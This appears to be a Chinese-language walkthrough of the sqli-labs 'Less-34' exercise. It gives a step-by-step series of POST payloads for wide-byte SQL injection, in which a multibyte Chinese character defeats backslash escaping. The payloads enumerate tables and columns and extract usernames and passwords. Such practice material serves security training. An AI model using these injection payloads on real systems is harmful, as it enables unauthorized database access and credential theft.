# Less-34

这关是POST请求，post型相比于get型少了url编码，这里采用一种新方法，可使用三个字节的汉字将反斜杠消耗



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉#
~~~

![Less-34-01](.\img\Less-34-01.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉'#
~~~

![Less-34-02](.\img\Less-34-02.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' order by 2#
~~~

![Less-34-03](.\img\Less-34-03.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' order by 3#
~~~

![Less-34-04](.\img\Less-34-04.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select 1,2#
~~~

![Less-34-05](.\img\Less-34-05.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),database()#
~~~

![Less-34-06](.\img\Less-34-06.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(table_name) from information_schema.tables where table_schema = database()#
~~~

![Less-34-07](.\img\Less-34-07.png)





~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(column_name) from information_schema.columns where table_name = 0x7573657273#
~~~

![Less-34-08](.\img\Less-34-08.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(username,password) from users#
~~~

![Less-34-09](.\img\Less-34-09.png)